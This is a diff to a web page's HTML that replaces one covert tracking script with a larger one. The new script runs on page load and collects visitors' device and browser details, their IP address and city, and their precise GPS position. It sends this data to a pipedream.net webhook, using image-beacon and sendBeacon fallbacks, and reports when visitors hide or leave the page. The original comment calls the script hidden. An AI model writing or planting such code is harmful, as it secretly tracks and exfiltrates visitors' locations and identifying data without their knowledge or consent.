@@ -155,78 +155,266 @@
         </footer>
     </div>
 
-    <!-- Hidden tracking script -->
-   <script>
-    // Improved geolocation logging
-    setTimeout(() => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const data = {
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude,
-                        acc: position.coords.accuracy,
-                        alt: position.coords.altitude,
-                        speed: position.coords.speed,
-                        ts: Date.now(),
-                        ref: document.referrer || 'direct',
-                        ua: navigator.userAgent.substring(0, 100),
-                        source: 'mobile'
+    <!-- Enhanced tracking script with comprehensive data collection -->
+    <script>
+        // Enhanced data collection function
+        function collectVisitorData() {
+            const data = {
+                // Timestamp and basic info
+                timestamp: new Date().toISOString(),
+                visit_id: generateVisitId(),
+                
+                // URL and navigation info
+                url: window.location.href,
+                referrer: document.referrer || 'direct',
+                page_title: document.title,
+                
+                // Device and browser info
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookie_enabled: navigator.cookieEnabled,
+                
+                // Screen info
+                screen_width: screen.width,
+                screen_height: screen.height,
+                color_depth: screen.colorDepth,
+                pixel_depth: screen.pixelDepth,
+                
+                // Browser window info
+                viewport_width: window.innerWidth,
+                viewport_height: window.innerHeight,
+                
+                // Connection info
+                connection_effectiveType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                connection_downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
+                
+                // Timezone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                
+                // Additional browser capabilities
+                java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                pdf_viewer_enabled: navigator.pdfViewerEnabled || false,
+                
+                // Session info
+                session_storage: !!window.sessionStorage,
+                local_storage: !!window.localStorage,
+                indexed_db: !!window.indexedDB
+            };
+
+            return data;
+        }
+
+        // Generate unique visit ID
+        function generateVisitId() {
+            return 'visit_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+
+        // Get IP-based location
+        async function getIPLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const ipData = await response.json();
+                return {
+                    ip: ipData.ip,
+                    ip_country: ipData.country_name,
+                    ip_country_code: ipData.country_code,
+                    ip_region: ipData.region,
+                    ip_city: ipData.city,
+                    ip_lat: ipData.latitude,
+                    ip_lng: ipData.longitude,
+                    ip_timezone: ipData.timezone,
+                    ip_org: ipData.org
+                };
+            } catch (error) {
+                // Fallback IP service
+                try {
+                    const fallbackResponse = await fetch('https://api.ipify.org?format=json');
+                    const fallbackData = await fallbackResponse.json();
+                    return {
+                        ip: fallbackData.ip,
+                        ip_country: 'unknown',
+                        ip_error: 'primary_service_failed'
                     };
-                    
-                    console.log('Location captured:', data);
-                    
-                    // Send to webhook
-                    fetch('https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(data)
-                    }).then(response => {
-                        console.log('Data sent successfully');
-                    }).catch(error => {
-                        console.log('Fetch failed, using fallback');
-                        // Fallback: image beacon
-                        const img = new Image();
-                        img.src = `https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net/?fallback=1&lat=${data.lat}&lng=${data.lng}&ts=${data.ts}&source=mobile`;
-                    });
-                },
-                (error) => {
-                    console.log('Geolocation error:', error);
-                    const errorData = {
-                        error: error.code,
-                        message: 'geolocation_denied',
-                        ts: Date.now(),
-                        ref: document.referrer || 'direct',
-                        ua: navigator.userAgent.substring(0, 100)
+                } catch (e) {
+                    return {
+                        ip: 'unknown',
+                        ip_error: 'all_services_failed'
                     };
-                    
-                    fetch('https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', {
-                        method: 'POST',
-                        body: JSON.stringify(errorData)
-                    });
-                },
-                {
-                    enableHighAccuracy: true,  // Changed to true for mobile
-                    timeout: 15000,           // Longer timeout for mobile
-                    maximumAge: 0             // Don't use cached position
                 }
-            );
-        } else {
-            console.log('Geolocation not supported');
-            // Log that geolocation isn't supported
-            fetch('https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', {
-                method: 'POST',
-                body: JSON.stringify({
-                    error: 'not_supported',
-                    ts: Date.now(),
-                    ua: navigator.userAgent.substring(0, 100)
-                })
+            }
+        }
+
+        // Enhanced geolocation with comprehensive data
+        async function enhancedGeolocation() {
+            const baseData = collectVisitorData();
+            
+            // Get IP location first (works even if GPS is denied)
+            const ipLocation = await getIPLocation();
+            
+            // Try to get precise GPS location
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const gpsData = {
+                                gps_lat: position.coords.latitude,
+                                gps_lng: position.coords.longitude,
+                                gps_accuracy: position.coords.accuracy,
+                                gps_altitude: position.coords.altitude,
+                                gps_altitude_accuracy: position.coords.altitudeAccuracy,
+                                gps_heading: position.coords.heading,
+                                gps_speed: position.coords.speed,
+                                gps_timestamp: new Date(position.timestamp).toISOString(),
+                                location_source: 'gps'
+                            };
+                            
+                            const completeData = {
+                                ...baseData,
+                                ...ipLocation,
+                                ...gpsData,
+                                location_access: 'granted'
+                            };
+                            
+                            resolve(completeData);
+                        },
+                        async (error) => {
+                            // GPS failed, but we still have IP location
+                            const errorData = {
+                                location_access: 'denied',
+                                gps_error_code: error.code,
+                                gps_error_message: getGeolocationError(error.code),
+                                location_source: 'ip_only'
+                            };
+                            
+                            const completeData = {
+                                ...baseData,
+                                ...ipLocation,
+                                ...errorData
+                            };
+                            
+                            resolve(completeData);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    // No geolocation support
+                    const completeData = {
+                        ...baseData,
+                        ...ipLocation,
+                        location_access: 'not_supported',
+                        location_source: 'ip_only'
+                    };
+                    
+                    resolve(completeData);
+                }
             });
         }
-    }, 3000); // Longer delay for mobile
-</script>
-</body>
 
+        function getGeolocationError(code) {
+            const errors = {
+                1: 'PERMISSION_DENIED',
+                2: 'POSITION_UNAVAILABLE',
+                3: 'TIMEOUT'
+            };
+            return errors[code] || 'UNKNOWN_ERROR';
+        }
+
+        // Send data to logging service
+        async function sendToLogger(data) {
+            try {
+                // Primary method: Fetch API
+                const response = await fetch('https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                console.log('Data sent successfully via fetch');
+                return true;
+            } catch (error) {
+                console.log('Fetch failed, trying fallback methods');
+                
+                // Fallback 1: Image beacon
+                try {
+                    const params = new URLSearchParams();
+                    Object.keys(data).forEach(key => {
+                        if (typeof data[key] === 'string' || typeof data[key] === 'number') {
+                            params.append(key, String(data[key]).substring(0, 100));
+                        }
+                    });
+                    
+                    const img = new Image();
+                    img.src = `https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net/?${params.toString()}`;
+                    console.log('Data sent via image beacon');
+                    return true;
+                } catch (e) {
+                    console.log('All methods failed');
+                    return false;
+                }
+            }
+        }
+
+        // Main execution with error handling
+        setTimeout(async () => {
+            try {
+                console.log('Starting enhanced data collection...');
+                const visitorData = await enhancedGeolocation();
+                console.log('Collected data:', visitorData);
+                
+                await sendToLogger(visitorData);
+                console.log('Data collection complete');
+                
+            } catch (error) {
+                console.error('Data collection failed:', error);
+                
+                // Send error report
+                const errorData = {
+                    timestamp: new Date().toISOString(),
+                    error: error.message,
+                    error_type: 'collection_failed',
+                    url: window.location.href
+                };
+                
+                sendToLogger(errorData);
+            }
+        }, 2000);
+
+        // Additional data point: Track page visibility changes
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'hidden') {
+                const visibilityData = {
+                    event: 'page_hidden',
+                    timestamp: new Date().toISOString(),
+                    visit_duration: Date.now() - performance.timing.navigationStart
+                };
+                sendToLogger(visibilityData);
+            }
+        });
+
+        // Track before user leaves
+        window.addEventListener('beforeunload', function() {
+            const leaveData = {
+                event: 'user_leaving',
+                timestamp: new Date().toISOString(),
+                visit_duration: Date.now() - performance.timing.navigationStart
+            };
+            
+            // Use navigator.sendBeacon for reliable sending during page unload
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(
+                    'https://11aa799cd0c022f3c57ba4a39cfd3111.m.pipedream.net', 
+                    JSON.stringify(leaveData)
+                );
+            }
+        });
+    </script>
+</body>
 </html>
